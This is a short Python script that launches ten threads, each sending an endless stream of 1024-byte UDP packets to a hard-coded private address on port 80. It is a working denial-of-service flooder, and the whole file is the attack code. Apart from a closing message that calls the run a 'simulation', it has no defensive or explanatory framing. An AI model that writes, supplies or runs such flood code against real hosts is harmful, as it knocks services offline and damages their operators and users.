import socket
import threading

def udp_flood(target_ip, target_port):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        data = b'A' * 1024
        while True:
            sock.sendto(data, (target_ip, target_port))

def main():
    ip = '192.168.0.10'
    port = 80
    threads = []
    for _ in range(10):
        t = threading.Thread(target=udp_flood, args=(ip, port), daemon=True)
        t.start()
        threads.append(t)
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print('Stopping simulation.')

if __name__ == '__main__':
    main()
